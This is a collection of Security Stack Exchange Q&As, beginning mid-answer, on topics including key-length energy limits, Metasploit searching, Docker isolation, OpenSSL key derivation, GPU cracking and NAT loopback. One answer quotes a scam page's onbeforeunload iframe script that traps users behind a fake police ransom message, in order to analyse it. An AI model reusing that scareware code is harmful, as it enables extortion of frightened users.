<p>Let's look at a more mundane perspective. It seems fair to assume that, with existing technology, each elementary operation must somehow imply the switching of at least one logic gate. The switching power of a single <a href=""http://en.wikipedia.org/wiki/CMOS"">CMOS</a> gate is about <em>C*V<sup>2</sup></em> where <em>C</em> is the gate load capacitance, and <em>V</em> is the voltage at which the gate operates. As of 2011, a very high-end gate will be able to run with a voltage of 0.5 V and a load capacitance of a few femtofarads (""femto"" meaning ""10<sup>-15</sup>""). This leads to a minimal energy consumption per operation of no less than, say, 10<sup>-15</sup> J. The current total world energy consumption is around 500 EJ (5*10<sup>20</sup> J) per year (or so says <a href=""http://en.wikipedia.org/wiki/World_energy_consumption"">this article</a>). Assuming that the total energy production of the Earth is diverted to a single computation for ten years, we get a limit of 5*10<sup>36</sup>, which is close to 2<sup>122</sup>.</p>

<p>Then you have to take into account technological advances. Given the current trend on ecological concerns and the <a href=""http://en.wikipedia.org/wiki/Peak_oil"">peak oil</a>, the total energy production should not increase much in the years to come (say no more than a factor of 2 until year 2040 -- already an ecologist's nightmare). On the other hand, there is technological progress in the design of integrated circuits. <a href=""https://en.wikipedia.org/wiki/Moore%27s_law"">Moore's law</a> states that you can fit twice as many transistors on a given chip surface every two years. A <em>very</em> optimistic view is that this doubling of the number of transistor can be done at constant energy consumption, which would translate to halving the energy cost of an elementary operation every two years. This would lead to a grand total of <strong>2<sup>138</sup> in year 2040</strong> -- and this is for a single ten-year-long computation which mobilizes <em>all</em> the resources of the entire planet.</p>

<p>So the usual wisdom of ""128 bits are more than enough for the next few decades"" is not off (it all depends on what you would consider to be ""safely"" out of reach, but my own paranoia level is quite serene with 128 bits ""only"").</p>

<p>A note on quantum computers: a QC can do quite a lot in a single ""operation"". The usual presentation is that the QC performs ""several computations simultaneously, which we filter out at the end"". This assertion is wrong in many particulars, but it still contain a bit of truth: a QC should be able to attack <em>n</em>-bit symmetric cryptography (e.g. symmetric encryption with a <em>n</em>-bit key) in <em>2<sup>n/2</sup></em> elementary quantum operations. Hence the classic trick: to account for quantum computers (if they ever exist), double the key length. Hence AES with a 256-bit key, SHA-512... (the 256-bit key of AES was not designed to protect against hypothetical quantum computers, but that's how 256-bit keys get justified nowadays).</p>
","6149"
"Browsing exploits with Metasploit console","32319","","<p>Is there any way to browse certain exploits in MSFconsole? The <code>show exploits</code> command shows too many and I cannot find a way to show just Windows file format exploits, for example.</p>
","<p>There's a couple of ways you could do this, that spring to mind</p>

<p>First up would be using search  which will show exploits matching the search term, (eg, search fileformat would return modules matching that term.  The other was would be to use the tab completion, so if you type:</p>

<p><code>use exploit/windows/fileformat/</code> and then hit <kbd>Tab</kbd>. It'll scroll through all the exploits under that folder.</p>
","4194"
"Possible ways to track down anonymous mail senders?","32150","","<p>In my previous post here <a href=""https://security.stackexchange.com/questions/24570/how-can-i-send-emails-anonymously"">How can I send emails anonymously?</a> the community framed and guided how we can send an anonymous emails through various ways which makes me thought about the following things</p>

<p>Normally we would trace the email using email headers; my scenario is in the following form:</p>

<p>How can we track-down the mail sender if he uses a virtual machine with an IP hiding tool and sending it through anonymous services </p>

<p>What are the best ways to track down this kind of anonymous mail sender?</p>
","<p>If the service is working right, you can't.</p>

<p>You can just work with the information that is supplied to you, unless you can gather access to the anonymous mail sending service. This could be possible if you work for a LEA or are able to break into the service (but that would be illegal, of course).
The information that is supplied is the body of the mail, the headers of the mail and attachments. Metadata in attachments can expose somebodies identity.</p>

<p>For example tormail has mailservers working as hidden services and some in the normal internet, so, if you send a mail, you are connected to the hidden service so your IP isn't exposed. Unless he gives the hidden service any information that would compromise his identity, you can't get anything to track him down.</p>
","25055"
"Enable RDP for internal network only","32149","","<p>I just got a tablet and I want to use it to RDP into my main computer. The thing is, the first thing I did when I set up my PC was to disable RDP. I am not comfortable, and have no use for, allowing RDP connections from outside my network.</p>

<p>I might be using the term network wrongly; I don't have any sort of network setup, just your standard commercial router. </p>

<p>I tried going into the firewall settings to try to limit port 3389 and I did not see any way to limit traffic by IP address.</p>

<p>I am using Windows 7 ultimate.</p>
","<p>You should make sure that you are using RDP with the strongest encryption levels enabled. You should also consider using the built-in windows firewall (<a href=""http://social.technet.microsoft.com/Forums/en-US/w7itprosecurity/thread/c50db20c-0eb3-4435-9e3a-5f1e08bc577f/"">see how to set this up with advanced settings</a>) or another firewall to only allow connections from your tablet. You can also ensure that your router doesn't allow the RDP port from the Internet.</p>

<p>Other options are to run RDP over SSH. You can do this with OpenSSH, or free for personal use in <a href=""http://www.bitvise.com/tunnelier"">Tunnelier</a>, which I have used in the past for secured RDP over SSH (free for home use). If you go over SSH you can then use certificates, which gives you a much higher level of security since its impractical to break the certificate key in addition to your password.</p>
","34712"
"Is it possible to clone an RFID/NFC card using a simple RFID reader, for future reuse and impersonation?","32063","","<p>RFID/NFC technology is <a href=""http://www.ultramagicard.com/technology/rfid-cards/"">used in credit cards</a> and many other personal identification applications.</p>

<p>Is it possible/how easy is it to clone a card using a <a href=""http://www.dx.com/p/rfid-rc522-rf-ic-card-sensor-module-blue-silver-203517"">simple RFID reader</a>?</p>

<p>In other words, can the retrieved information be reused in the future by the attacker?</p>
","<p>NFC devices which do not use either public key crypto, encrypted tokens or HMAC tokens or similar cryptographic mechanisms where there is a secret that never leaves the device, they can all be impersonated. Simple devices often just have a static string of data which they broadcast. </p>

<p>Many newer NFC devices as well as most enterprise grade devices since basically forever use cryptography which prevents impersonation. </p>

<p>However, some of the new credit cards lack this type of cryptography. But from what I understand most of them now implements cryptography as defined by the EMV security standards. </p>

<p>Then there's also the issue of that some of the variants like some Mifare variants are crackable due to sidechannel attacks against the cryptography. IIRC most newer ones aren't vulnerable, but I'm not entirely sure on the current state on this. </p>
","71362"
"What makes Docker more secure than VMs or bare metal?","31959","","<p>I recently had a discussion with a Docker expert about the security of Docker vs. virtual machines. When I told that I've read from different sources that it's easier for code running within a Docker container to escape from it than for a code running in a virtual machine, the expert explained that I'm completely wrong, and that <strong>Docker machines are actually <em>more</em> secure in terms of preventing the malicious code from affecting other machines, compared to virtual machines or bare metal</strong>.</p>

<p>Although he tried to explain what makes Docker containers more secure, his explanation was too technical for me.</p>

<p>From what I understand, “OS-level virtualization reuses the kernel-space between virtual machines” as explained in <a href=""https://security.stackexchange.com/a/148794/7684"">a different answer</a> on this site. In other words, code from a Docker container could exploit a kernel vulnerability, which wouldn't be possible to do from a virtual machine.</p>

<p>Therefore, what could make it inherently more secure to use Docker compared to VMs or bare metal isolation, in a context where code running in a container/machine would intentionally try to escape and infect/damage other containers/machines? Let's assume Docker is configured properly, which prevents three of the four categories of attacks described <a href=""https://security.stackexchange.com/a/153016/7684"">here</a>.</p>
","<p>No, Docker containers are not more secure than a VM.</p>

<p>Quoting <a href=""https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/"" rel=""nofollow noreferrer"">Daniel Shapira</a>:</p>

<blockquote>
  <p>In 2017 alone, <a href=""https://www.cvedetails.com/product/47/Linux-Linux-Kernel.html?vendor_id=33"" rel=""nofollow noreferrer"">434 linux kernel exploits where found</a>, and as you have seen in this post, kernel exploits can be devastating for containerized environments. This is because containers share the same kernel as the host, thus trusting the built-in protection mechanisms alone isn’t sufficient.</p>
</blockquote>

<p><strong>1. Kernel exploits from a container</strong></p>

<p>If someone exploits a kernel bug inside a container, it exploited it on the host OS. If this exploit allows for code execution, it will be executed on the host OS, not inside the container.</p>

<p>If this exploit allows for arbitrary memory access, the attacker can change or read any data for any other container.</p>

<p>On a VM, the process is longer: the attacker would have to exploit both the VM kernel, the hypervisor, and the host kernel (and this may not be the same as the VM kernel).</p>

<p><strong>2. Resource starvation</strong></p>

<p>As all the containers share the same kernel, and the same resources, if the access to some resource is not constrained, one container can use it all up and starve the host OS and the other containers.</p>

<p>On a VM, the resources are defined by the hypervisor, so no VM  can deny the host OS from any resource, as the hypervisor itself can be configured to make restricted use of resources.</p>

<p><strong>3. Container breakout</strong></p>

<p>If any user inside a container is able to escape the container using some exploit or misconfiguration, it will have access to all containers running on the host. That happens because the same user running the docker engine is the user running the containers. If any exploit executes code on the host, it will execute under the privileges of the docker engine, so it can access any container.</p>

<p><strong>4. Data separation</strong></p>

<p>On a docker container, there's some resources that are not namespaced:</p>

<ul>
<li>SELinux</li>
<li>Cgroups</li>
<li>file systems under <code>/sys</code>, <code>/proc/sys</code>,</li>
<li><code>/proc/sysrq-trigger</code>, <code>/proc/irq</code>, <code>/proc/bus</code></li>
<li><code>/dev/mem</code>, <code>/dev/sd*</code> file system </li>
<li>Kernel Modules</li>
</ul>

<p>If any attacker can exploit any of those elements, it will own the host OS.</p>

<p>A VM OS will not have direct access to any of those elements. It will talk to the hypervisor, and the hypervisor will make the appropriate system calls to the host OS. It will filter out invalid calls, adding a layer of security.</p>

<p><strong>5. Raw Sockets</strong></p>

<p>The default docker Unix socket (<code>/var/run/docker.sock</code>) can be mounted by any container if not properly secured. If some container mounts this socket, it can shutdown, start or create new images.</p>

<hr>

<p>If properly configured and secured, you can achieve a high level of security with a docker container, but it will be less than a properly configured VM. No matter how much hardening tools are employed, a VM will always be more secure. Bare metal isolation is even more secure than a VM. Some bare metal implementations (IBM PR/SM for example) can guarantee that the partitions are as separated as if they were on separate hardware. As far as I know, there's no way to escape a PR/SM virtualization.</p>
","169649"
"How do I verify that WhatsApp is using end-to-end encryption?","31927","","<p>Slightly old news: <a href=""http://www.wired.com/2014/11/whatsapp-encrypted-messaging/"">Whatsapp Just Switched on End-to-End Encryption for Hundreds of Millions of Users</a></p>

<p>Is there any test that I can perform to verify that WhatsApp is indeed using end-to-end encryption between my and another Android phone?</p>
","<p>There isn't any quick check you can perform in order to be sure that end-to-end encryption is used. Even if you manage to get this confirmation, then you have to make sure that the used encryption keys never left your device (and the device of your friend). If end-to-end encryption is used, but WhatsApp or someone else has access to the encryption keys, the chat is no longer confidential.</p>

<p>There is some available information which can allow a security researcher to start investigating the matter:</p>

<ul>
<li>The encryption software is known and the code is open source (even if we do not know what changes were made to the WhatsApp implementation)</li>
</ul>

<blockquote>
  <p>WhatsApp will integrate the open-source software Textsecure, created by privacy-focused non-profit Open Whisper Systems, which scrambles messages with a cryptographic key that only the user can access and never leaves his or her device</p>
</blockquote>

<ul>
<li><a href=""https://github.com/WhisperSystems/TextSecure"">TextSecure GitHub</a></li>
</ul>

<p>P.S.: There is at least one way to tell if they are <strong>not</strong> using end-to-end encryption and parsing the contents of your messages. Some time ago, a security researcher discovered that URLs sent in Skype messages are accessed from Microsoft IP addresses (<a href=""http://yro.slashdot.org/story/13/05/14/1516247/microsoft-reads-your-skype-chat-messages"">link</a>). You can try the same thing by setting up a web server and sending some unique URLs on WhatsApp.</p>
","79090"
"openssl: recover key and IV by passphrase","31835","","<p>A large amount of files were encrypted by </p>

<pre><code>    openssl enc -aes-256-cbc -pass pass:MYPASSWORD
</code></pre>

<p>Openssl should derive key+IV from passphrase. <strong>I'd like to know key+IV equivalent of that MYPASSWORD</strong>. Is that possible? </p>

<p>I know MYPASSWORD. I could decrypt and then re-encrypt with new known key+IV with:</p>

<pre><code>    openssl enc -d -aes-256-cbc -pass pass:MYPASSWORD
    openssl enc -aes-256-cbc -K MYKEY -IV MYIV
</code></pre>

<p>But the problem is that the amount of data is quite large.</p>
","<p>Usage of the <code>openssl enc</code> command-line option is described <a href=""http://www.openssl.org/docs/apps/enc.html"">there</a>. Below, I will answer your question, but don't forget to have a look at the last part of my text, where I take a look at what happens under the hood. It is... instructive.</p>

<hr />

<p>OpenSSL uses a <em>salted</em> key derivation algorithm. The salt is a piece of random bytes which are generated when encrypting, and stored in the file header; upon decryption, the salt is retrieved from the header, and the key and IV are recomputed from the provided password <em>and the salt value</em>.</p>

<p>On the command-line, you can use the <code>-P</code> option (uppercase P) to print out the salt, key and IV, and then exit. You can also use the <code>-p</code> (lowercase P) to print out the salt, key and IV, and then proceed with the encryption. First try this out:</p>

<pre><code>openssl enc -aes-256-cbc -pass pass:MYPASSWORD -P
</code></pre>

<p>If you run this command several times, you will notice that each invocation returns different values ! That's because, in the absence of the <code>-d</code> flag, <code>openssl enc</code> does <em>encryption</em> and generates a random salt each time. Since the salt varies, so do the key and IV. Thus, the <code>-P</code> flag is not very useful when encrypting; the <code>-p</code> flag, however, can be used. Let's try again; this time, we have the file <code>foo_clear</code> which we want to encrypt into <code>foo_enc</code>. Let's run this:</p>

<pre><code>openssl enc -aes-256-cbc -pass pass:MYPASSWORD -p -in foo_clear -out foo_enc
</code></pre>

<p>This command will encrypt the file (thus creating <code>foo_enc</code>) <em>and</em> print out something like this:</p>

<pre><code>salt=A68D6E406A087F05
key=E7C8836AD32C688444E3928F69F046715F8B33AF2E52A6E67A626B586DE8024E
iv =B9F128D827203729BE52A834CC0890B7
</code></pre>

<p>These values are the salt, key and IV which were actually used to encrypt the file.</p>

<p>If I want to get them back afterwards, I can use the <code>-P</code> flag in conjunction with the <code>-d</code> flag:</p>

<pre><code>openssl enc -aes-256-cbc -pass pass:MYPASSWORD -d -P -in foo_enc
</code></pre>

<p>which will print out the <em>same</em> salt, key and IV than above, every time. How so ? That's because this time we are <em>decrypting</em>, so the header of <code>foo_enc</code> is read, and the salt retrieved. For a given salt value, derivation of the password into key and IV is deterministic.</p>

<p>Moreover, this key-and-IV retrieval is fast, even if the file is very long, because the <code>-P</code> flag prevents actual decryption; it reads the <em>header</em>, but stops there.</p>

<p><strong>Alternatively</strong>, you can specify the salt value with the <code>-S</code> flag, or deactivate the salt altogether with <code>-nosalt</code>. Unsalted encryption is <em>not recommended at all</em> because it may allow speeding up password cracking with precomputed tables (the same password always yields the same key and IV). If you provide the salt value, then you become responsible for generating proper salts, i.e. trying to make them as unique as possible (in practice, you have to produce them randomly). It is preferable to let <code>openssl</code> handle that, since there is ample room for silent failures (""silent"" meaning ""weak and crackable, but the code still works so you do not detect the problem during your tests"").</p>

<hr />

<p>The encryption format used by OpenSSL is non-standard: it is ""what OpenSSL does"", and if all versions of OpenSSL tend to agree with each other, there is still no reference document which describes this format except OpenSSL source code. The header format is rather simple:</p>

<pre><code>magic value (8 bytes): the bytes 53 61 6c 74 65 64 5f 5f
salt value (8 bytes)
</code></pre>

<p>Hence a fixed 16-byte header, beginning with the ASCII encoding of the string ""Salted__"", followed by the salt itself. That's all ! No indication of the encryption algorithm; you are supposed to keep track of that yourself.</p>

<p>The process by which the password and salt are turned into the key and IV is not documented, but a look at the source code shows that it calls the OpenSSL-specific <a href=""http://www.openssl.org/docs/crypto/EVP_BytesToKey.html"">EVP_BytesToKey()</a> function, which uses a custom <a href=""http://en.wikipedia.org/wiki/Key_derivation_function"">key derivation function</a> with some repeated hashing. This is a non-standard and not-well vetted construct (!) which relies on the MD5 hash function of dubious reputation (!!); that function can be changed on the command-line with the <em>undocumented</em> <code>-md</code> flag (!!!); the ""iteration count"" is set by the <code>enc</code> command to <strong>1</strong> and cannot be changed (!!!!). This means that the first 16 bytes of the key will be equal to <em>MD5(password||salt)</em>, and that's it.</p>

<p><strong>This is quite weak !</strong> Anybody who knows how to write code on a PC can try to crack such a scheme and will be able to ""try"" several dozens of millions of potential passwords per second (hundreds of millions will be achievable with a GPU). <strong>If you use ""openssl enc"", make sure your password has very high entropy !</strong> (i.e. higher than usually recommended; aim for 80 bits, at least). Or, preferably, don't use it at all; instead, go for something more robust (<a href=""http://www.gnupg.org/"">GnuPG</a>, when doing symmetric encryption for a password, uses a stronger KDF with many iterations of the underlying hash function).</p>
","29139"
"What techniques do advanced firewalls use to protect againt DoS/DDoS?","31655","","<p>It is hard to protect a server against <a href=""http://en.wikipedia.org/wiki/Denial-of-service_attack"">Denial of Service attacks</a>, DoS/DDoS. The two simple ways I can think of is to use a server with much resources (e.g. CPU and memory), and to build the server application to scale-up very well. Other protection mechanisms is probably used by the firewall. I can think of black-listing IP-addresses, but I don't really know how it works. And there is probably other techniques that are used by the firewall to protect against DDoS attacks.</p>

<p>What techniques do advanced firewalls use to protect againt DoS/DDoS attacks?</p>
","<p>Those are really two different, though similar, attacks.   </p>

<p>""Regular"" DoS is based on trying crash the server/firewall, through some kind of bug or vulnerability. E.g. the well known <a href=""http://en.wikipedia.org/wiki/Syn_flood"">SYN Flood</a> attacks. The protection against these, are of course specific to the flaw (e.g. SYN cookies), and secure coding/design in general.  </p>

<p>However, DDoS simply attempts to overwhelm the server/firewall by flooding it with masses of apparently legitimate requests.<br>
Truthfully, a single firewall cannot really protect against this, since there is no real way to mark the ""bad"" clients. It's just a question of ""best-effort"", such as throttling itself so it doesnt crash, load balancers and failover systems, <em>attempting</em> to blacklist IPs (if not according to ""badness"", then according to usage), and of course, actively notifying the administrators.<br>
This last might be the most important, since in cases of apparent DDoS (I say apparent, because just regular peak usage might <em>look</em> like DDoS - true story) it really takes a human to differentiate the context of the situation, and figure out whether to shut down, best effort, provision another box, etc (or employ counter-attack... ssshhh!!) </p>
","120"
"Site preventing user from closing tab/closing browser","31633","","<p>I've come across the following website</p>

<pre><code>hxxp://politie.nl.id169787298-7128265115.e2418.com/ [Possible malware]
</code></pre>

<p>Whenever I open it in Firefox it prevents me from closing it, I can't even close the browser without using the task manager. The site asks for money for an unlock and I can imagine some people could fall for it. How can this happen? I thought Firefox was a more or less secure browser?</p>

<p>I haven't checked it on other browsers.</p>
","<p>Update: this is no longer a concern on Firefox (29+) and Chrome (version? not sure if it was ever an issue there). Firefox will only display a single dialog now.</p>

<p>Firefox 31 additionally makes the dialog non-modal, and will also close the window if you press the close button a second time.</p>

<p>Unfortunately, IE11 still shows multiple dialogs. I'm not sure if Microsoft is aware of this issue.</p>

<hr>

<p>The method is pretty simple, actually. If you inspect the source, you'll see a lot of repetition of this line:</p>

<pre><code>&lt;iframe test=""test"" srcdoc=""&lt;script&gt; window.onbeforeunload=function(env){ return 'YОUR BRОWSЕR HAS BЕЕN LОCKЕD. АLL PC DАTА WILL BЕ DЕTАINЕD АND CRIMINАL PRОCЕDURЕS WILL BЕ INITIАTЕD АGАINST YОU IF THЕ FINЕ WILL NОT BЕ PАID.';} &lt;/script&gt;"" src=""au/close.php""&gt;&lt;/iframe&gt;
</code></pre>

<p>Basically, they have a whole bunch of iframes and each iframe can trigger the 'are you sure you want to leave' message once. It's not infinite by any means (as Braiam said, you can just hold down <kbd>enter</kbd> on the leave page), but it's probably enough to trick some people.</p>

<p>This is arguably behaving as intended - though it may be better to add one of those ""don't show again"" checkboxes, much like they do for <code>alert</code> popups.</p>

<p>Another way to prevent this kind of thing is to disable JavaScript on sites you don't trust. NoScript works well. This can, however, be somewhat annoying and/or break sites at times.</p>

<hr>

<p>For the interested: Chrome actually displays one long dialog. That comes with its own problems - and this <em>is</em> a browser bug - the buttons get pushed out of the bottom of the page (happens with any too-long Chrome popup). You can still hit <kbd>enter</kbd>. The Chrome dialog seems to be initiated by a different <code>alert</code> popup, and it actually <em>doesn't</em> seem to display the iframe unload text at all - it's likely they added this specifically to trap Chrome users:</p>

<pre><code>&lt;script type=""text/javascript""&gt;window.onbeforeunload = function(env){var str = '\n\nUw br' + 'оws' + 'еr is gе' + 'blо' + 'kkе' + 'еrd.\n\nAl' + 'le P' + 'C dа' + 'tа zu' + 'lle' + 'n wо' + 'rde' + 'n vа' + 'stgе' + 'hou' + 'den e' + 'n st' + 'rаf' + 'rес' + 'htе' + 'li' + 'jk' + 'е pr' + 'ocе' + 'dur' + 'es zu' + 'lle' + 'n wо' + 'rd' + 'en ing' + 'еlе' + 'id te' + 'ge' + 'n u al' + 's d' + 'e bo' + 'еt' + 'е ni' + 'et wo' + 'rd' + 't be' + 'taa' + 'ld.\n\n';
        alert(str);
    return str;
}
&lt;/script&gt;
</code></pre>

<p>Again, it's nothing more than a scary popup that seems to be impossible to get rid of. Malicious? Yes. Actually dangerous? Not really. As long as you don't fall for the scam.</p>

<hr>

<p>Also of potential interest is that they <em>do</em> display your public IP and approximate location. This is a fairly standard scare tactic on these scam sites and really isn't anything special - <em>any</em> site you connect to can get your public IP, and public GeoIP databases can usually provide the approximate location. If you're really worried, go get a VPN or anonymous proxy to connect through.</p>
","46273"
"Why are GPUs so good at cracking passwords?","31626","","<p>What is it about GPUs that lets them crack passwords so quickly?</p>

<p>It seems like the driving force behind adopting good key-derivation functions for passwords (bcrpyt, PBKDF2, scrypt) instead of yesterday's cryptographic hash (MD*, SHA*) is that the later are vulnerable to programs that run on GPUs and guess huge numbers of passwords extremely quickly. Why should GPUs happen to be so much better at evaluating those hash functions than CPUs?</p>
","<p>To complete @Terry's answer: a GPU has a lot of cores (hundreds). Each core is basically able to compute one 32-bit arithmetic operation per clock cycle -- as a <strong>pipeline</strong>. Indeed, GPU work well with <em>extreme parallelism</em>: when there are many identical work units to perform, actually many more than actual cores (""identical"" meaning ""same instructions"", but not ""same data"").</p>

<p><strong>Some details</strong>, for a somewhat old NVidia card (a GTX 9800+, from early 2009): there are 128 cores, split into 16 ""multicore units"". Each multicore can initiate 8 operations per cycle (hence the idea of 128 cores: that's 16 times 8). The multicore handles work units (""threads"") by groups of 32, so that when a multicore has an instruction to run, it actually issues that instruction to its 8 cores over 4 clock cycles. This is operation <em>initiation</em>: each individual operation takes up to 22 clock cycles to run. You can imagine the instruction and its operands walking into the circuit as an advancing front line, like a wave in a pool: a given wave will take some time to reach the other end of the pool, but you can send several waves sequentially.</p>

<p>So you can maintain the rhythm of ""128 32-bit operations per cycle"" only as long as you have at least 22 times as many ""threads"" to run (i.e. a minimum of 22·128 = 2816), such that threads can be grouped by packs of 32 ""identical"" threads which execute the same instructions at the same time, like hip-hop dancers. In practice, there are some internal thresholds and constraints which require more threads to achieve the optimal bandwidth, up to about 4096.</p>

<p>I could achieve close to 99% of the optimal bandwidth with a SHA-1 implementation. SHA-1 uses a bit more than 1100 32-bit operations (that would be around 900 on a CPU, but a GTX 9800+ has no <em>rotation</em> opcode, so rotations must be split into two shifts and a logical or), and the GPU ran at 1450 MHz, for a grand total of about <strong>160 million</strong> SHA-1 computations per second. This can be achieved only as long as you have <em>millions</em> of SHA-1 instances to compute in parallel, as is the case for password cracking (at any time, you need 4096 parallel SHA-1 to feed the GPU cores, but you also have to deal with I/O costs for input of potential passwords, and these costs will dominate if you do not have a lot of SHA-1 instances to process).</p>

<p>The host PC, on its CPU (a quad-core 2.4 GHz Intel Core2), could achieve about <strong>48 million</strong> SHA-1 per second, and <em>that</em> was with thoroughly optimized SSE2 code. A single SHA-1 will use about 500 clock cycles on such a CPU (the CPU can compute several instructions in a single cycle, provided they don't compete for resources and don't depend on each other), but, for password cracking, it is worthwhile to use <a href=""http://en.wikipedia.org/wiki/SSE2"">SSE2</a> with its 128-bit registers, and able to compute 4 instructions in parallel. With SSE2 constraints, it takes about 800 clock cycles to run four parallel SHA-1, so that's 200 clock cycles per SHA-1 instance. There are four cores in that CPU and the whole thing runs at 2400 MHz, hence 48 million per second.</p>

<p>More recent hardware will be faster, but GPU more so. A GTX 680 sports a whooping 1536 cores, and there are <em>two</em> such GPU in a GTX 690. We are talking <em>billions</em> of SHA-1 instances per second here.</p>

<p>(For comparison, I also did an implementation of SHA-1 on the <a href=""http://en.wikipedia.org/wiki/Cell_%28microprocessor%29"">Cell processor</a>, i.e. the CPU in a PS3 console, with its 8 ""SPU"" coprocessors. One SPU was not available. With the 7 others, I reached about 100 million SHA-1 per second, i.e. better than a contemporary big PC CPU, but not as good as a good GPU of the same era.)</p>

<hr />

<p><strong>Summary:</strong> GPU achieve great performance by using heavy parallelism, with hundreds (if not thousands) of cores. This is made possible by <em>pipelining</em> (each individual operation takes many cycles to run, but successive operations can be launched like trucks on a highway) and sharing instruction decoding (since many cores will run the same instructions at the same time).</p>
","32845"
"How to explain buffer overflow to a layman","31590","","<p>Every once in a while (when I think out loud and people overhear me) I am forced to explain what a buffer overflow is. Because I can't really think of a good metaphor, I end up spending about 10 minutes explaining how (vulnerable) programs work and memory allocation, and then have about 2 sentences on the actual exploit (""so a buffer overflow fills the buffer up with nonsense and overwrites the pointer to point to whatever I want it to point to""). By this time, most people have become suicidal... What is a good way to explain a buffer overflow to laymen? If possible, please include an ""overflow"" component, but also at least a lead-in to why this means the attacker can get what he wants. Remember, people of average (and below average) intelligence should be able to get an idea of what I am talking about, so while you should absolutely feel free (encouraged, actually) to explain what each part of your metaphor (analogy?) represents, don't rely on any super-technical descriptions...</p>

<p>PS, a related question explaining in technical terms what the buffer overflow does: <a href=""https://security.stackexchange.com/questions/37980/what-is-a-buffer-overflow"">What is a buffer overflow?</a></p>
","<p>Imagine you have a list of people you owe money to.</p>

<p><img src=""https://i.stack.imgur.com/uZ68n.png"" alt=""Name | Amount owing""></p>

<p>Also, you have a weird pen with built-in correction fluid, so that if you write something in a particular place, and then write something else, it erases the first thing you wrote. This is how computer memory works, which is a bit different from how writing normally works.</p>

<p>You pay someone a $500 deposit on a $5000 car, so you now owe them $4500. They tell you their name is John Smith. You write the amount (4500) and the name (John Smith) in the table. Your table now looks like this:</p>

<p><img src=""https://i.stack.imgur.com/yXv9A.png"" alt=""John Smith | 4500""></p>

<p>Later your table reminds you to pay them back. You pay the $4500 (plus interest) and erase it from the table, so now your table is blank again.</p>

<p>Then you get a $1000 loan from someone else. They tell you their name is ""John Smithxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx9999999999"".
You write the amount (1000) and the name (John Smithxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx9999999999) in your table. Your table now looks like this:</p>

<p><img src=""https://i.stack.imgur.com/3qpC5.png"" alt=""John Smithxxxxxxxxxxxxxxxxxxxxxxx|x99999999990""></p>

<p>(the last 0 from 1000 was not written over. This is unimportant.)</p>

<p>When writing the name, you didn't stop when you got to the end of the ""name"" column, and kept writing into the ""amount owing"" column! This is a buffer overflow.</p>

<p>Later, your table reminds you that you owe $99999999990 to John Smithxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx. You find him again and pay him almost 100 billion dollars.</p>
","53884"
"Is NAT Loopback on my router a security problem?","31526","","<p>Some DSL routers prevent NAT loopback. Security is sometimes cited as the reason. Is NAT loopback really a security issue? And if so, how is this exploited?</p>

<p>NAT loopback... where a machine on the LAN is able to access another machine on the LAN via the external IP address of the LAN/router (with port forwarding set up on the router to direct requests to the appropriate machine on the LAN). Without NAT loopback you must use the internal IP address of the device when on the LAN.</p>

<p><strong>EDIT:</strong> The mentions of security are admittedly from unofficial sources, which is why I would like to clarify this...</p>

<p>From the <a href=""http://community.bt.com/t5/BB-Speed-Connection-Issues/Home-Hub-3-Port-Forwarding-NOT/m-p/548707#M141644"">BT Community Forums</a>:</p>

<blockquote>
  <p>This is not a fault. Most routers will not send out and receive data
  on the same interface (Loopback), as this is a security risk.</p>
</blockquote>

<p>And <a href=""http://community.bt.com/t5/BB-Speed-Connection-Issues/Home-Hub-3-Port-Forwarding-NOT/m-p/549709#M141824"">further down the same page</a>, from the same user:</p>

<blockquote>
  <p>As a network engineer I work with Cisco and Brocade routers daily and
  these will not allow loopback due to the inherent security issues. BT
  have adopted an approach that security is very important and as with
  enterprise class routers, loopback is not permitted.</p>
</blockquote>

<p>From <a href=""http://opensimulator.org/wiki/NAT_Loopback_Routers"">a page on NAT Loopback Routers</a>:</p>

<blockquote>
  <p>Many DSL routers/modems prevent loopback connections as a security
  feature.</p>
</blockquote>

<p>To be honest, up until now I have always assumed that failure to support NAT loopback was simply a failure in the hardware/firmware, not a 'security feature'?! It's omission is a far greater problem IMHO. (If you hadn't guessed, my router does not support NAT loopback.)</p>
","<p>Most consumer grade routers don't have any prohibition against it, it just doesn't work.</p>

<p>Imagine the following scenario. This isn't hypothetical, just run <code>tcpdump</code> on your own computer and you'll see it happen right now. Captured from my Buffalo ddwrt moments ago just to verify.</p>

<p>Players: [Router: 10.0.0.1]  [Computer1: 10.0.0.3]  [Computer2: 10.0.0.4]<br>
Outside IP: 99.99.99.99, forwarded to Computer2</p>

<ul>
<li><p><strong>Computer1 to Router  [10.0.0.3 -> 99.99.99.99]</strong></p></li>
<li><p><em>Router uses DNAT to change the destination to 10.0.0.4 and pushes it back to the local network:</em><br>
<strong>Router to Computer2 [10.0.0.3 -> 10.0.0.4]</strong></p></li>
<li><p><em>Computer2 attempts to respond to the packet by sending to the source IP.</em><br>
<strong>Computer2 to Computer1 [10.0.0.4 -> 10.0.0.3]</strong></p></li>
<li><p><strong>Computer1: WTF?</strong><br>
<em>Computer1 was expecting a reply from 99.99.99.99, got one from 10.0.0.4 instead. Addresses don't match, connection failure, RST packet sent back.</em></p></li>
</ul>

<p>Now, you ask, why doesn't the router SNAT the connection from Computer1 to the router's internal IP when it DNATs it to Computer2? Because the SNAT rule would make a mess of all the rest of the traffic which doesn't follow the pattern above.</p>

<p>SNAT really should only be used in one direction unless you're willing to put a lot of time and care into crafting and maintaining a NAT ruleset that won't bite you.</p>

<p>And to preempt anyone who says how about this: </p>

<pre><code>iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -d 10.0.0.0/24 -j MASQUERADE
</code></pre>

<p>I would point out that this rule would affect not only to NAT-loopback traffic, but also to <em>bridge</em> traffic (e.g. WiFi network to Wired network), which would make a WiFi router frustratingly broken. The rule would have to be tailored to match ONLY the loopback traffic, which is slightly more tricky and probably involves marking packets. Not impossible, but not the sort of engineering and debugging that goes into most routers; and certainly fraught with peril.</p>

<p><em>Glossary:</em><br>
<strong>SNAT</strong> = Source NAT (changing the source IP)<br>
<strong>DNAT</strong> = Destination NAT (changing the destination IP)<br>
<strong>NAT</strong> = Network Address Translation  </p>
","16359"
"Disadvantages of Using a VPN?","31363","","<p>I've got a yearly subscription to a VPN service which is real quick and from the research I did at the time seems to be pretty legitimate, but are there any disadvantages or scenarios where you perhaps shouldn't use a VPN?</p>

<p>I'm from the UK and I usually just have the VPN setup to automatically route everything through a VPN server located in London. </p>

